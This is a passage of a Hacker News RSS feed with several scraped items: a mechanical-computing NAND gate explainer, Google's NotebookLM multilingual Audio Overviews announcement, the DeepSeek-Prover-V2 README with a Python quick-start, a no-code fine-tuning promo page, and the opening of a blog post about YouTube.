The most basic element is a â€œlock.â€ Itâ€™s constructed with two triangles that are allowed to slide back and forth. However, once the top triangle has been pushed forward, it prevents the bottom triangle from being pushed forward (and vice versa). Itâ€™s called a â€œlockâ€ because the first triangle to get pushed forward will â€œlock outâ€ the other.
</p>

<p>
The demo below is made from springs and pivot points. Drag the sliders to engage the top and bottom parts of a lock.
</p>



<p><label for="slider-a">Top Input:</label>
  
</p>
<p><label for="slider-b">Bottom Input:</label>
  
</p>

<canvas id="sim1" width="750" height="230"></canvas>



<p>
In principle, these locks could be constructed out of physical materials on very small scales. The authors of the original paper provided this example schematic of a 30 x 30 x 7 nm lock constructed out of carbon:
</p>


<p><img src="https://tennysontbardwell.com/blog/2025/04/30/mechanical-computing/atomic.png" alt="atomic.png">
</p>
</div>
</div>
<div id="outline-container-org85972e1">
<h2 id="org85972e1">The â€œBalanceâ€</h2>
<div id="text-org85972e1">
<p>
Ultimately, our binary convention will be that either the â€œ1â€ line or the â€œ0â€ line of a bit will always be engaged. A balance helps make this happen. It consists of two locks and a lever before them. On the forward edge of a clock, it forces a horizontal translation through whichever lock is not already engaged.
</p>

<p>
Try engaging only one of the two locks (top or bottom) and then engaging the clock. The clock will â€œflow throughâ€ whichever lock has not already been engaged by the inputs:
</p>



<p><label>Top Input:</label>
  
</p>
<p><label>Bottom Input:</label>
  
</p>
<p><label>Clock Input:</label>
  
</p>

<canvas id="sim2" width="750" height="280"></canvas>


</div>
</div>
<div id="outline-container-org61cfdc6">
<h2 id="org61cfdc6">Bellcrank</h2>
<div id="text-org61cfdc6">
<p>
The last thing that we will need to construct a NAND gate is a way to route and split signals. It turns out to be relatively simple:
</p>


<p><label>Input:</label>
  
</p>

<canvas id="sim3" width="750" height="450"></canvas>


</div>
</div>
<div id="outline-container-org627b816">
<h2 id="org627b816">NAND Simulation</h2>
<div id="text-org627b816">
<p>
And now we are ready to construct a NAND gate, which is a â€œuniversal gateâ€ (i.e., you can implement any truth table using only NAND gates). We first use two â€œwiresâ€ for each input. If <code>A</code> is <code>TRUE</code>, then the first wire is pushed forward. If <code>A</code> is <code>FALSE</code>, then the second wire is pushed forward. Likewise, if <code>B</code> is <code>TRUE</code> then the third wire is pushed forward, and the fourth wire is pushed forward if <code>B</code> is <code>FALSE</code>.
</p>

<p>
We expect to always have exactly two of these wires push forward for any computation. Following these input wires, we see that each individual wire engages exactly two locks, preventing the thrust of the clock from flowing through that pathway. Since there are four pathways, we must make sure that only one pathway is unlocked at any time. Then, when the clock arrives, that pathway will receive the forward thrust.
</p>


</div>


<canvas id="simulator" width="750" height="380"></canvas>



<p>
If youâ€™re interested in learning more, one of the authors gave a 20 minute overview of this paper at the CCC Workshop on Reversible Computing: <a href="https://www.youtube.com/watch?v=yVX9Ob4SjGA">Ralph Merkle: Molecular Mechanical Computing</a>.
</p>
</div>
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[NotebookLM Audio Overviews are now available in over 50 languages (274 pts)]]></title>
            <link>https://blog.google/technology/google-labs/notebooklm-audio-overviews-50-languages/</link>
            <guid>43848325</guid>
            <pubDate>Wed, 30 Apr 2025 17:28:38 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://blog.google/technology/google-labs/notebooklm-audio-overviews-50-languages/">https://blog.google/technology/google-labs/notebooklm-audio-overviews-50-languages/</a>, See on <a href="https://news.ycombinator.com/item?id=43848325">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="jump-content" tabindex="-1">
            

    
    

    <article>

    
    





    

    
      

<div data-analytics-module="{
    &quot;module_name&quot;: &quot;Hero Menu&quot;,
    &quot;section_header&quot;: &quot;NotebookLM Audio Overviews are now available in over 50 languages&quot;
  }">
  
  <div>
      <div>
          
            <p>Apr 29, 2025</p>
          
          
            <p data-reading-time-render="">[[read-time]] min read</p>
          
        </div>
      
        <p>
          Audio Overviews are now multilingual, and you can try it out today.
        </p>
      
    </div>
  
  <div>
  <p>Arielle Fox</p>
  
    <p>
      Program Manager, Google Labs
    </p>
  
  
</div>
</div>

    

    
      










<div>
    <figure>
      <div>
        <p><img alt="NotebookLM logo surrounded by waveforms and language options like English, à¦¬à¦¾à¦‚à¦²à¦¾ (Bengali), Nederlands (Dutch), EspaÃ±ol (Spanish), Ø§Ù„Ø¹Ø±Ø¨ÙŠØ© (Arabic), and Ð±ÑŠÐ»Ð³Ð°Ñ€ÑÐºÐ¸ (Bulgarian), suggesting multilingual capabilities." data-component="uni-progressive-image" fetchpriority="high" height="150px" src="https://storage.googleapis.com/gweb-uniblog-publish-prod/images/NLM_Language_OV_Header_01_41J1Ffj.width-200.format-webp.webp" width="360px" data-sizes="(max-width: 1023px) 100vw,(min-width: 1024px and max-width: 1259) 80vw, 1046px" data-srcset="https://storage.googleapis.com/gweb-uniblog-publish-prod/images/NLM_Language_OV_Header_01_41J1Ffj.width-800.format-webp.webp 800w, https://storage.googleapis.com/gweb-uniblog-publish-prod/images/NLM_Language_OV_Header_01_41J1Ff.width-1200.format-webp.webp 1200w, https://storage.googleapis.com/gweb-uniblog-publish-prod/images/NLM_Language_OV_Header_01_41J1Ff.width-1600.format-webp.webp 1600w, https://storage.googleapis.com/gweb-uniblog-publish-prod/images/NLM_Language_OV_Header_01_41J1Ff.width-2200.format-webp.webp 2200w">
        </p>
      </div>
      
    </figure>
  </div>






    

    
    <div data-reading-time="true" data-component="uni-article-body">

            
              





<uni-article-speakable page-title="NotebookLM Audio Overviews are now available in over 50 languages" listen-to-article="Listen to article" data-date-modified="2025-04-30T14:43:57.674112+00:00" data-tracking-ids="G-HGNBTNCHCQ,G-6NKTLKV14N" data-voice-list="en.ioh-pngnat:Cyan,en.usb-pngnat:Lime" data-script-src="https://www.gstatic.com/readaloud/player/web/api/js/api.js"></uni-article-speakable>

            

            
            
<!--article text-->

  
    <div data-component="uni-article-paragraph" role="presentation" data-analytics-module="{
           &quot;module_name&quot;: &quot;Paragraph&quot;,
           &quot;section_header&quot;: &quot;NotebookLM Audio Overviews are now available in over 50 languages&quot;
         }"><p data-block-key="x4y2k">Last year, we expanded NotebookLM to more than 200 countries and now weâ€™re making Audio Overviews available in more than 50 languages.</p><p data-block-key="73jd9"><a href="https://blog.google/technology/ai/notebooklm-audio-overviews/">Audio Overviews</a>, which turn your sources into engaging, podcast-like conversations, were immediately popular when they launched late last year. Now, thanks to Geminiâ€™s native audio support, even more people can use Audio Overviews in their preferred language, from <a href="https://support.google.com/notebooklm/answer/15731776">Afrikaans to Hindi to Turkish â€” and more.</a> This is an early look at what's possible with this feature â€” we plan to keep building and refining it based on your feedback.</p></div>
  

  
    
  
    


  <uni-youtube-player-article index="2" thumbnail-alt="NotebookLM audio overviews" video-id="VJg37fVPy9I" video-type="video">
  </uni-youtube-player-article>


  


  

  
    <div data-component="uni-article-paragraph" role="presentation" data-analytics-module="{
           &quot;module_name&quot;: &quot;Paragraph&quot;,
           &quot;section_header&quot;: &quot;NotebookLM Audio Overviews are now available in over 50 languages&quot;
         }"><p data-block-key="x4y2k">Audio Overviews are generated in your accountâ€™s preferred language. This update also introduces a new "Output Language" option in NotebookLM's settings; your Audio Overviews are always generated in the language you select here. You can change the language at any time and your audio and chat responses will reflect this, making it easy to create multilingual content or study materials as needed.</p><p data-block-key="anamm">For example, a teacher preparing a lesson on the Amazon rainforest can share resources in various languages â€” like a Portuguese documentary, a Spanish research paper and English study reports â€” with their students. The students can upload these and can generate an Audio Overview of key insights in their preferred language. This capability breaks down language barriers and makes the information more accessible to everyone.</p></div>
  

  
    






<uni-image-full-width alignment="full" alt-text="notebooklm audio overviewsw language output" external-image="" or-mp4-video-title="Language Output NotebookLM" or-mp4-video-url="https://storage.googleapis.com/gweb-uniblog-publish-prod/original_videos/F405_NLM_StudentBlogAssets_LanguageOutput_1.mp4" section-header="NotebookLM Audio Overviews are now available in over 50 languages" custom-class="image-full-width--constrained-width uni-component-spacing">
  
  
</uni-image-full-width>


  

  
    <div data-component="uni-article-paragraph" role="presentation" data-analytics-module="{
           &quot;module_name&quot;: &quot;Paragraph&quot;,
           &quot;section_header&quot;: &quot;NotebookLM Audio Overviews are now available in over 50 languages&quot;
         }">
        <p data-block-key="x4y2k">We hope bringing more languages to Audio Overviews helps you discover new insights and connect with information in your own language. Try it out today at <a href="https://notebooklm.google/">notebooklm.google</a>. Give it a listen, ä¾†è½çœ‹çœ‹, Ã©coutez!</p>
      </div>
  


            
            

            
              




            
          </div>
  </article>
  





  

  


<div data-component="uni-related-articles" data-analytics-module="{
    &quot;module_name&quot;: &quot;Article Footer Related Stories&quot;,
    &quot;section_header&quot;: &quot;Related stories&quot;
  }">
        <h3>
          <p>
            Related stories
          </p>
        </h3>
      </div></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[DeepSeek-Prover-V2 (346 pts)]]></title>
            <link>https://github.com/deepseek-ai/DeepSeek-Prover-V2</link>
            <guid>43847432</guid>
            <pubDate>Wed, 30 Apr 2025 16:23:28 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/deepseek-ai/DeepSeek-Prover-V2">https://github.com/deepseek-ai/DeepSeek-Prover-V2</a>, See on <a href="https://news.ycombinator.com/item?id=43847432">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-hpc="true"><article itemprop="text">


<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/deepseek-ai/DeepSeek-V2/blob/main/figures/logo.svg?raw=true"><img src="https://github.com/deepseek-ai/DeepSeek-V2/raw/main/figures/logo.svg?raw=true" width="60%" alt="DeepSeek-V3"></a>
</p>
<hr>

<p dir="auto">
  <a href="#2-model-summary">Model Summary</a> |
  <a href="#3-proverbench">ProverBench</a> |
  <a href="#4-model-dataset-downloads">Model&amp;Dataset Download</a> |
  <a href="#5-quick-start">Quick Start</a> |
  <a href="#6-license">License</a> |
  <a href="#7-contact">Contact</a>
</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">DeepSeek-Prover-V2: Advancing Formal Mathematical Reasoning via Reinforcement Learning for Subgoal Decomposition</h2><a id="user-content-deepseek-prover-v2-advancing-formal-mathematical-reasoning-via-reinforcement-learning-for-subgoal-decomposition" aria-label="Permalink: DeepSeek-Prover-V2: Advancing Formal Mathematical Reasoning via Reinforcement Learning for Subgoal Decomposition" href="#deepseek-prover-v2-advancing-formal-mathematical-reasoning-via-reinforcement-learning-for-subgoal-decomposition"></a></p>
<p dir="auto"><h2 tabindex="-1" dir="auto">1. Introduction</h2><a id="user-content-1-introduction" aria-label="Permalink: 1. Introduction" href="#1-introduction"></a></p>
<p dir="auto">We introduce DeepSeek-Prover-V2, an open-source large language model designed for formal theorem proving in Lean 4, with initialization data collected through a recursive theorem proving pipeline powered by DeepSeek-V3. The cold-start training procedure begins by prompting DeepSeek-V3 to decompose complex problems into a series of subgoals. The proofs of resolved subgoals are synthesized into a chain-of-thought process, combined with DeepSeek-V3's step-by-step reasoning, to create an initial cold start for reinforcement learning. This process enables us to integrate both informal and formal mathematical reasoning into a unified model.</p>
<p dir="auto">
  <a target="_blank" rel="noopener noreferrer" href="https://github.com/deepseek-ai/DeepSeek-Prover-V2/blob/main/figures/performance.png"><img width="100%" src="https://github.com/deepseek-ai/DeepSeek-Prover-V2/raw/main/figures/performance.png"></a>
</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">2. Model Summary</h2><a id="user-content-2-model-summary" aria-label="Permalink: 2. Model Summary" href="#2-model-summary"></a></p>
<hr>
<p dir="auto"><strong>Synthesize Cold-Start Reasoning Data through Recursive Proof Search</strong></p>
<ul dir="auto">
<li>
<p dir="auto">To construct the cold-start dataset, we develop a simple yet effective pipeline for recursive theorem proving, utilizing DeepSeek-V3 as a unified tool for both subgoal decomposition and formalization. We prompt DeepSeek-V3 to decompose theorems into high-level proof sketches while simultaneously formalizing these proof steps in Lean 4, resulting in a sequence of subgoals.</p>
</li>
<li>
<p dir="auto">We use a smaller 7B model to handle the proof search for each subgoal, thereby reducing the associated computational burden. Once the decomposed steps of a challenging problem are resolved, we pair the complete step-by-step formal proof with the corresponding chain-of-thought from DeepSeek-V3 to create cold-start reasoning data.</p>
</li>
</ul>
<hr>
<p dir="auto"><strong>Reinforcement Learning with Synthetic Cold-Start Data</strong></p>
<ul dir="auto">
<li>
<p dir="auto">We curate a subset of challenging problems that remain unsolved by the 7B prover model in an end-to-end manner, but for which all decomposed subgoals have been successfully resolved. By composing the proofs of all subgoals, we construct a complete formal proof for the original problem. This proof is then appended to DeepSeek-V3's chain-of-thought, which outlines the corresponding lemma decomposition, thereby producing a cohesive synthesis of informal reasoning and subsequent formalization.</p>
</li>
<li>
<p dir="auto">After fine-tuning the prover model on the synthetic cold-start data, we perform a reinforcement learning stage to further enhance its ability to bridge informal reasoning with formal proof construction. Following the standard training objective for reasoning models, we use binary correct-or-incorrect feedback as the primary form of reward supervision.</p>
</li>
<li>
<p dir="auto">The resulting model, DeepSeek-Prover-V2-671B, achieves state-of-the-art performance in neural theorem proving, reaching <math-renderer data-static-url="https://github.githubassets.com/static" data-run-id="10c342b53976c609710245a8ba9916e2">$88.9$</math-renderer>% pass ratio on the MiniF2F-test and solving 49 out of 658 problems from PutnamBench. The proofs generated by DeepSeek-Prover-V2 for the miniF2F dataset are available for download as a <a href="https://github.com/deepseek-ai/DeepSeek-Prover-V2/blob/master/minif2f-solutions.zip">ZIP archive</a>.</p>
</li>
</ul>
<hr>
<p dir="auto"><h2 tabindex="-1" dir="auto">3. ProverBench: Formalization of AIME and Textbook Problems</h2><a id="user-content-3-proverbench-formalization-of-aime-and-textbook-problems" aria-label="Permalink: 3. ProverBench: Formalization of AIME and Textbook Problems" href="#3-proverbench-formalization-of-aime-and-textbook-problems"></a></p>
<p dir="auto">we introduce ProverBench, a benchmark dataset comprising 325 problems. Of these, 15 are formalized from number theory and algebra questions featured in the recent AIME competitions (AIME 24 and 25), offering authentic high-school competition-level challenges. The remaining 310 problems are drawn from curated textbook examples and educational tutorials, contributing a diverse and pedagogically grounded collection of formalized mathematical problems. This benchmark is designed to enable more comprehensive evaluation across both high-school competition problems and undergraduate-level mathematics.</p>
<div dir="auto">
<markdown-accessiblity-table><table>
<thead>
<tr>
<th>Area</th>
<th>Count</th>
</tr>
</thead>
<tbody>
<tr>
<td>AIME 24&amp;25</td>
<td>15</td>
</tr>
<tr>
<td>Number Theory</td>
<td>40</td>
</tr>
<tr>
<td>Elementary Algebra</td>
<td>30</td>
</tr>
<tr>
<td>Linear Algebra</td>
<td>50</td>
</tr>
<tr>
<td>Abstract Algebra</td>
<td>40</td>
</tr>
<tr>
<td>Calculus</td>
<td>90</td>
</tr>
<tr>
<td>Real Analysis</td>
<td>30</td>
</tr>
<tr>
<td>Complex Analysis</td>
<td>10</td>
</tr>
<tr>
<td>Functional Analysis</td>
<td>10</td>
</tr>
<tr>
<td>Probability</td>
<td>10</td>
</tr>
<tr>
<td>Total</td>
<td>325</td>
</tr>
</tbody>
</table></markdown-accessiblity-table>
</div>
<p dir="auto"><h2 tabindex="-1" dir="auto">4. Model &amp; Dataset Downloads</h2><a id="user-content-4-model--dataset-downloads" aria-label="Permalink: 4. Model &amp; Dataset Downloads" href="#4-model--dataset-downloads"></a></p>
<p dir="auto">We release DeepSeek-Prover-V2 in two model sizes: 7B and 671B parameters. DeepSeek-Prover-V2-671B is trained on top of DeepSeek-V3-Base. DeepSeek-Prover-V2-7B is built upon DeepSeek-Prover-V1.5-Base and features an extended context length of up to 32K tokens.</p>


<p dir="auto"><h2 tabindex="-1" dir="auto">5. Quick Start</h2><a id="user-content-5-quick-start" aria-label="Permalink: 5. Quick Start" href="#5-quick-start"></a></p>
<p dir="auto">You can directly use <a href="https://github.com/huggingface/transformers">Huggingface's Transformers</a> for model inference. DeepSeek-Prover-V2-671B shares the same architecture as DeepSeek-V3. For detailed information and supported features, please refer to <a href="https://github.com/huggingface/transformers/blob/main/docs/source/en/model_doc/deepseek_v3.md">the DeepSeek-V3 documentation on Hugging Face</a>.</p>
<p dir="auto">The following is a basic example of generating a proof for a problem from the miniF2F dataset:</p>
<div dir="auto" data-snippet-clipboard-copy-content="from transformers import AutoModelForCausalLM, AutoTokenizer
import torch
torch.manual_seed(30)

model_id = &quot;DeepSeek-Prover-V2-7B&quot;  # or DeepSeek-Prover-V2-671B
tokenizer = AutoTokenizer.from_pretrained(model_id)

formal_statement = &quot;&quot;&quot;
import Mathlib
import Aesop

set_option maxHeartbeats 0

open BigOperators Real Nat Topology Rat

/-- What is the positive difference between $120\%$ of 30 and $130\%$ of 20? Show that it is 10.-/
theorem mathd_algebra_10 : abs ((120 : â„) / 100 * 30 - 130 / 100 * 20) = 10 := by
  sorry
&quot;&quot;&quot;.strip()

prompt = &quot;&quot;&quot;
Complete the following Lean 4 code:

```lean4
{}
```

Before producing the Lean 4 code to formally prove the given theorem, provide a detailed proof plan outlining the main proof steps and strategies.
The plan should highlight key ideas, intermediate lemmas, and proof structures that will guide the construction of the final formal proof.
&quot;&quot;&quot;.strip()

chat = [
  {&quot;role&quot;: &quot;user&quot;, &quot;content&quot;: prompt.format(formal_statement)},
]

model = AutoModelForCausalLM.from_pretrained(model_id, device_map=&quot;auto&quot;, torch_dtype=torch.bfloat16, trust_remote_code=True)
inputs = tokenizer.apply_chat_template(chat, tokenize=True, add_generation_prompt=True, return_tensors=&quot;pt&quot;).to(model.device)

import time
start = time.time()
outputs = model.generate(inputs, max_new_tokens=8192)
print(tokenizer.batch_decode(outputs))
print(time.time() - start)"><pre><span>from</span> <span>transformers</span> <span>import</span> <span>AutoModelForCausalLM</span>, <span>AutoTokenizer</span>
<span>import</span> <span>torch</span>
<span>torch</span>.<span>manual_seed</span>(<span>30</span>)

<span>model_id</span> <span>=</span> <span>"DeepSeek-Prover-V2-7B"</span>  <span># or DeepSeek-Prover-V2-671B</span>
<span>tokenizer</span> <span>=</span> <span>AutoTokenizer</span>.<span>from_pretrained</span>(<span>model_id</span>)

<span>formal_statement</span> <span>=</span> <span>"""</span>
<span>import Mathlib</span>
<span>import Aesop</span>
<span></span>
<span>set_option maxHeartbeats 0</span>
<span></span>
<span>open BigOperators Real Nat Topology Rat</span>
<span></span>
<span>/-- What is the positive difference between $120\%$ of 30 and $130\%$ of 20? Show that it is 10.-/</span>
<span>theorem mathd_algebra_10 : abs ((120 : â„) / 100 * 30 - 130 / 100 * 20) = 10 := by</span>
<span>  sorry</span>
<span>"""</span>.<span>strip</span>()

<span>prompt</span> <span>=</span> <span>"""</span>
<span>Complete the following Lean 4 code:</span>
<span></span>
<span>```lean4</span>
<span>{}</span>
<span>```</span>
<span></span>
<span>Before producing the Lean 4 code to formally prove the given theorem, provide a detailed proof plan outlining the main proof steps and strategies.</span>
<span>The plan should highlight key ideas, intermediate lemmas, and proof structures that will guide the construction of the final formal proof.</span>
<span>"""</span>.<span>strip</span>()

<span>chat</span> <span>=</span> [
  {<span>"role"</span>: <span>"user"</span>, <span>"content"</span>: <span>prompt</span>.<span>format</span>(<span>formal_statement</span>)},
]

<span>model</span> <span>=</span> <span>AutoModelForCausalLM</span>.<span>from_pretrained</span>(<span>model_id</span>, <span>device_map</span><span>=</span><span>"auto"</span>, <span>torch_dtype</span><span>=</span><span>torch</span>.<span>bfloat16</span>, <span>trust_remote_code</span><span>=</span><span>True</span>)
<span>inputs</span> <span>=</span> <span>tokenizer</span>.<span>apply_chat_template</span>(<span>chat</span>, <span>tokenize</span><span>=</span><span>True</span>, <span>add_generation_prompt</span><span>=</span><span>True</span>, <span>return_tensors</span><span>=</span><span>"pt"</span>).<span>to</span>(<span>model</span>.<span>device</span>)

<span>import</span> <span>time</span>
<span>start</span> <span>=</span> <span>time</span>.<span>time</span>()
<span>outputs</span> <span>=</span> <span>model</span>.<span>generate</span>(<span>inputs</span>, <span>max_new_tokens</span><span>=</span><span>8192</span>)
<span>print</span>(<span>tokenizer</span>.<span>batch_decode</span>(<span>outputs</span>))
<span>print</span>(<span>time</span>.<span>time</span>() <span>-</span> <span>start</span>)</pre></div>
<p dir="auto"><h2 tabindex="-1" dir="auto">6. License</h2><a id="user-content-6-license" aria-label="Permalink: 6. License" href="#6-license"></a></p>
<p dir="auto">The use of DeepSeek-Prover-V2 models is subject to <a href="https://github.com/deepseek-ai/DeepSeek-Prover-V2/blob/main/LICENSE-MODEL">the Model License</a>.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">7. Contact</h2><a id="user-content-7-contact" aria-label="Permalink: 7. Contact" href="#7-contact"></a></p>
<p dir="auto">If you have any questions, please raise an issue or contact us at <a href="mailto:service@deepseek.com">service@deepseek.com</a>.</p>
</article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Show HN: Create your own finetuned AI model using Google Sheets (112 pts)]]></title>
            <link>https://promptrepo.com/finetune/</link>
            <guid>43846964</guid>
            <pubDate>Wed, 30 Apr 2025 15:53:36 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://promptrepo.com/finetune/">https://promptrepo.com/finetune/</a>, See on <a href="https://news.ycombinator.com/item?id=43846964">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
        
            <div>
                
                    <div>
                            <h3> No-code AI models </h3>
                            <h4> Build AI models directly in Google Sheets. Empower domain experts to create AI models without coding </h4>
                            
                                
                            
                        </div>
                    <p><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA3MzAgNTAwIiB3aWR0aD0iNzMwIiBoZWlnaHQ9IjUwMCI+CgkJCTxyZWN0IHdpZHRoPSI3MzAiIGhlaWdodD0iNTAwIiBmaWxsPSIjZjVmNWY1Ij48L3JlY3Q+ICAgCgkJCTx0ZXh0IHg9IjUwJSIgeT0iNTAlIiBkb21pbmFudC1iYXNlbGluZT0ibWlkZGxlIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiAKCQkJZm9udC1mYW1pbHk9IlJvYm90bywgQXJpYWwsIEhlbHZldGljYSwgc2Fucy1zZXJpZiIgCgkJCWZvbnQtc2l6ZT0iMjZweCIgZmlsbD0iIzIwMjEyNCIgbGV0dGVyLXNwYWNpbmc9Ii40Ij5Oby1jb2RlIEFJIG1vZGVsczwvdGV4dD4KCQk8L3N2Zz4=" data-src="/banner/finetune/google-sheet-no-code-ai-models.png" loading="lazy" alt="">
                    </p>
                
            </div>
        
            <div>
                
                    <p><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA3MzAgNTAwIiB3aWR0aD0iNzMwIiBoZWlnaHQ9IjUwMCI+CgkJCTxyZWN0IHdpZHRoPSI3MzAiIGhlaWdodD0iNTAwIiBmaWxsPSIjZjVmNWY1Ij48L3JlY3Q+ICAgCgkJCTx0ZXh0IHg9IjUwJSIgeT0iNTAlIiBkb21pbmFudC1iYXNlbGluZT0ibWlkZGxlIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiAKCQkJZm9udC1mYW1pbHk9IlJvYm90bywgQXJpYWwsIEhlbHZldGljYSwgc2Fucy1zZXJpZiIgCgkJCWZvbnQtc2l6ZT0iMjZweCIgZmlsbD0iIzIwMjEyNCIgbGV0dGVyLXNwYWNpbmc9Ii40Ij5UcmFpbiAmIERlcGxveSB3aXRoIEZsZXhpYmlsaXR5PC90ZXh0PgoJCTwvc3ZnPg==" data-src="/banner/finetune/google-sheet-train-deploy-flexibility.png" loading="lazy" alt="">
                    </p>
                    <div>
                            <h3> Train &amp; Deploy with Flexibility </h3>
                            <h4> Choose from OpenAI, Mistral, or LLaMA to train and deploy fine-tuned AI models with just a few clicks </h4>
                            
                                
                            
                        </div>
                
            </div>
        
            <div>
                
                    <div>
                            <h3> Easily evaluate AI models </h3>
                            <h4> Test your models with ease using Google Sheets formulas, an intuitive user interface, or API calls </h4>
                            
                                
                            
                        </div>
                    <p><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA3MzAgNTAwIiB3aWR0aD0iNzMwIiBoZWlnaHQ9IjUwMCI+CgkJCTxyZWN0IHdpZHRoPSI3MzAiIGhlaWdodD0iNTAwIiBmaWxsPSIjZjVmNWY1Ij48L3JlY3Q+ICAgCgkJCTx0ZXh0IHg9IjUwJSIgeT0iNTAlIiBkb21pbmFudC1iYXNlbGluZT0ibWlkZGxlIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiAKCQkJZm9udC1mYW1pbHk9IlJvYm90bywgQXJpYWwsIEhlbHZldGljYSwgc2Fucy1zZXJpZiIgCgkJCWZvbnQtc2l6ZT0iMjZweCIgZmlsbD0iIzIwMjEyNCIgbGV0dGVyLXNwYWNpbmc9Ii40Ij5FYXNpbHkgZXZhbHVhdGUgQUkgbW9kZWxzPC90ZXh0PgoJCTwvc3ZnPg==" data-src="/banner/finetune/easily-evaluate-ai-models.png" loading="lazy" alt="">
                    </p>
                
            </div>
        
            <div>
                
                    <p><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA3MzAgNTAwIiB3aWR0aD0iNzMwIiBoZWlnaHQ9IjUwMCI+CgkJCTxyZWN0IHdpZHRoPSI3MzAiIGhlaWdodD0iNTAwIiBmaWxsPSIjZjVmNWY1Ij48L3JlY3Q+ICAgCgkJCTx0ZXh0IHg9IjUwJSIgeT0iNTAlIiBkb21pbmFudC1iYXNlbGluZT0ibWlkZGxlIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiAKCQkJZm9udC1mYW1pbHk9IlJvYm90bywgQXJpYWwsIEhlbHZldGljYSwgc2Fucy1zZXJpZiIgCgkJCWZvbnQtc2l6ZT0iMjZweCIgZmlsbD0iIzIwMjEyNCIgbGV0dGVyLXNwYWNpbmc9Ii40Ij5CdWlsZCBBSSBtb2RlbHMgZm9yIGFueSB0YXNrPC90ZXh0PgoJCTwvc3ZnPg==" data-src="/banner/finetune/build-ai-models-any-task.png" loading="lazy" alt="">
                    </p>
                    <div>
                            <h3> Build AI models for any task </h3>
                            <h4> Create Classification, Extraction, and Generative AI fine-tuned models tailored to your specific use case </h4>
                            
                                
                            
                        </div>
                
            </div>
        
            <div>
                
                    <div>
                            <h3> API for Seamless Integration </h3>
                            <h4> Integrate your AI models into apps, websites, and workflows with an API, and launch AI features quickly </h4>
                            
                                
                            
                        </div>
                    <p><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA3MzAgNTAwIiB3aWR0aD0iNzMwIiBoZWlnaHQ9IjUwMCI+CgkJCTxyZWN0IHdpZHRoPSI3MzAiIGhlaWdodD0iNTAwIiBmaWxsPSIjZjVmNWY1Ij48L3JlY3Q+ICAgCgkJCTx0ZXh0IHg9IjUwJSIgeT0iNTAlIiBkb21pbmFudC1iYXNlbGluZT0ibWlkZGxlIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiAKCQkJZm9udC1mYW1pbHk9IlJvYm90bywgQXJpYWwsIEhlbHZldGljYSwgc2Fucy1zZXJpZiIgCgkJCWZvbnQtc2l6ZT0iMjZweCIgZmlsbD0iIzIwMjEyNCIgbGV0dGVyLXNwYWNpbmc9Ii40Ij5BUEkgZm9yIFNlYW1sZXNzIEludGVncmF0aW9uPC90ZXh0PgoJCTwvc3ZnPg==" data-src="/banner/finetune/api-seamless-integration.png" loading="lazy" alt="">
                    </p>
                
            </div>
        
            <div>
                
                    <p><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA3MzAgNTAwIiB3aWR0aD0iNzMwIiBoZWlnaHQ9IjUwMCI+CgkJCTxyZWN0IHdpZHRoPSI3MzAiIGhlaWdodD0iNTAwIiBmaWxsPSIjZjVmNWY1Ij48L3JlY3Q+ICAgCgkJCTx0ZXh0IHg9IjUwJSIgeT0iNTAlIiBkb21pbmFudC1iYXNlbGluZT0ibWlkZGxlIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiAKCQkJZm9udC1mYW1pbHk9IlJvYm90bywgQXJpYWwsIEhlbHZldGljYSwgc2Fucy1zZXJpZiIgCgkJCWZvbnQtc2l6ZT0iMjZweCIgZmlsbD0iIzIwMjEyNCIgbGV0dGVyLXNwYWNpbmc9Ii40Ij5CdWlsdC1pbiB2ZXJzaW9uIGNvbnRyb2w8L3RleHQ+CgkJPC9zdmc+" data-src="/banner/finetune/built-in-version-control.png" loading="lazy" alt="">
                    </p>
                    <div>
                            <h3> Built-in version control </h3>
                            <h4> From the build process to versioning, we handle all the grunt work, letting you focus on improving accuracy. </h4>
                            
                                
                            
                        </div>
                
            </div>
        
    </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Someone at YouTube Needs Glasses (1144 pts)]]></title>
            <link>https://jayd.ml/2025/04/30/someone-at-youtube-needs-glasses.html</link>
            <guid>43846487</guid>
            <pubDate>Wed, 30 Apr 2025 15:18:47 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://jayd.ml/2025/04/30/someone-at-youtube-needs-glasses.html">https://jayd.ml/2025/04/30/someone-at-youtube-needs-glasses.html</a>, See on <a href="https://news.ycombinator.com/item?id=43846487">Hacker News</a></p>
<div id="readability-page-1" class="page"><div aria-label="Content">
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>Opened YouTube and was greeted with this abomination:</p>

